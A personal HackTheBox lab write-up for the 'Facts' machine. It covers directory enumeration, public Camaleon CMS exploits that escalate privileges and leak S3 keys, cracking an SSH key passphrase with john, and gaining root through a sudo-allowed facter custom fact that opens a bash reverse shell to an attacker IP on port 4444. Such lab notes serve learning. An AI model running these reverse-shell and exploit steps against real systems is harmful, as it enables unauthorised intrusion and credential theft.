# HTBnotes
My own HackTheBox notes--based off various machines

1. Facts (Easy)
a. enumeration - nmap for ports, gobuster for subdomains/directories. command: `gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
b. then we found smth interesting--/admin/login
c. go to the login portal, spotted this whole website is running on Camaleon CMS 2.9.0, so looking for exploits online (I consulted claude). turns out there're 2 exploits on hand (CVE2024 and 2025, the 2024 one is helpful in terms of finding files, whereas the 2025 one is specifically on PrivEsc, so I went for this one).
c2. using the 2024 exploit, I registered an account and then got the list of users.
d. we got some basic but nonetheless critical info from the 2025 exploit:
  `[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
  [+]Login confirmed
  User ID: 5
  Current User Role: client
  [+]Loading PPRIVILEGE ESCALATION
  User ID: 5
  Updated User Role: admin
  [+]Extracting S3 Credentials
  **s3 access key: AKIA039E0D2F4085943B
  s3 secret key: yjAlObZyojaiBp8el9325yxUWarzHXwPpC0oq6IK
  s3 endpoint: http://localhost:54321**
  [+]Reverting User Role
  User ID: 5
  User Role: client`
e. So that we know this webapp is running on AWS S3. I installed awscli, configured it:
  `**┌─[✗]─[root@parrot]─[/home/chris/Documents/htb]
  └──╼ #aws configure
  AWS Access Key ID [****************943B]: AKIA039E0D2F4085943B
  AWS Secret Access Key [****************q6IK]: yjAlObZyojaiBp8el9325yxUWarzHXwPpC0oq6IK
  Default region name [us-east-1]: us-east-1
  Default output format [json]: json**`
f. checking buckets w the command
  `aws --endpoint-url http://facts.htb:54321 s3 ls (the endpoint url is the one you got from the output of the exploit)`
g. <img width="1576" height="832" alt="image" src="https://github.com/user-attachments/assets/1520241c-5da9-4c7e-b808-106ab2bf6ac3" /> //listed one of them and then downloaded the credentials within.
h. This is the confusing part.
  I used these commands:
`# Make sure I'm in the right directory
cd /home/chris/Documents/htb

# Extract the hash properly
python3 /usr/share/john/ssh2john.py id_ed25519 > ssh.hash

# Verify the hash was created
cat ssh.hash

# Now crack it
john --wordlist=/home/chris/Documents/wordlists/rockyou.txt ssh.hash`
  and I got the PARAPHRASE instead of the password. The way that I signed in as trivia thru ssh is by using:
  `ssh -i id_ed25519 trivia@facts.htb`
  bc we dont wanna type in any pwd since we have 0 idea abt what is it. And there're actually other users than trivia, the reason why we chose trivia is bc when we type in others' usrnames, it keeps pops up the line that asks us for pwd rather than just paraphrase.
i. after getting the user flag, I typed 
 `sudo -l`
 to get:
` trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
(ALL) NOPASSWD: /usr/bin/facter`
  We can see that, trivia may use facter without being root--and the follwing is the part that I dont truly understand as of 2/27/2026.
  We created a custom fact using:
    `echo 'Facter.add(:pwn) do
      setcode do
      system("bash -c \"bash -i >& /dev/tcp/10.10.15.196/4444 0>&1\"")  //the ip addy should be whatever i have
      end
      end' > /tmp/pwn.rb`
and listen on my local machine:
`nc -nlvp 4444`
lastly run this on target (trivia):
`sudo /usr/bin/facter --custom-dir /tmp`

And finally we had access to root on our listening port.

  
